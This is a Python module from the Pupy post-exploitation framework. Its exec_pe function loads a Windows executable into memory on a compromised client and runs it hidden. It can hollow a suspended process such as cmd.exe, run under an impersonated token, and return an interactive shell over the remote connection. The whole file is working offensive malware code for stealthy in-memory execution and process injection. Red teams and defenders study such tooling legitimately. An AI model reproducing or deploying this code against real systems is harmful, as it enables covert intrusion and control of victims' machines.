#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
from pupylib.utils.rpyc_utils import redirected_stdio
from pupylib.utils.pe import get_pe_arch
import time

def exec_pe(module, prog_args, path=None, raw_pe=None, interactive=False, fork=False, timeout=None, use_impersonation=False, suspended_process="cmd.exe"):
    if not raw_pe and not path:
        raise Exception("raw_pe or path must be supplied")
    if path:
        pe_arch=get_pe_arch(path)
        proc_arch=module.client.desc["proc_arch"]
        if pe_arch!=proc_arch:
            module.error("%s is a %s PE and your pupy payload is a %s process. Please inject a %s PE or migrate into a %s process first"%(path, pe_arch, proc_arch, proc_arch, pe_arch))
            return
    wait=True
    redirect_stdio=True
    if fork:
        wait=False
        redirect_stdio=False
    if not raw_pe:
        raw_pe=b""
        with open(path,'rb') as f:
            raw_pe=f.read()
    module.client.load_package("pupymemexec")
    module.client.load_package("pupwinutils.memexec")

    res=""
    dupHandle=None
    if use_impersonation:
        dupHandle=module.client.impersonated_dupHandle
        if dupHandle is None:
            module.error("No token has been impersonated on this session. use impersonate module first")
            return
    if not hasattr(module, 'mp'):
        setattr(module, 'mp', None)
    module.mp=module.client.conn.modules['pupwinutils.memexec'].MemoryPE(raw_pe, args=prog_args, hidden=True, redirect_stdio=redirect_stdio, suspended_process=suspended_process, dupHandle=dupHandle)
    with redirected_stdio(module.client.conn):
        module.mp.run()
    if not fork:
        if interactive:
            try:
                with redirected_stdio(module.client.conn):
                    module.mp.get_shell()
            finally:
                module.mp.close()
        else:
            starttime=time.time()
            while True:
                if module.mp.wait(1):
                    break
                if timeout:
                    if time.time()-starttime>timeout:
                        break
            module.mp.close()
            res=module.mp.get_stdout()
            module.log(res)
            return res
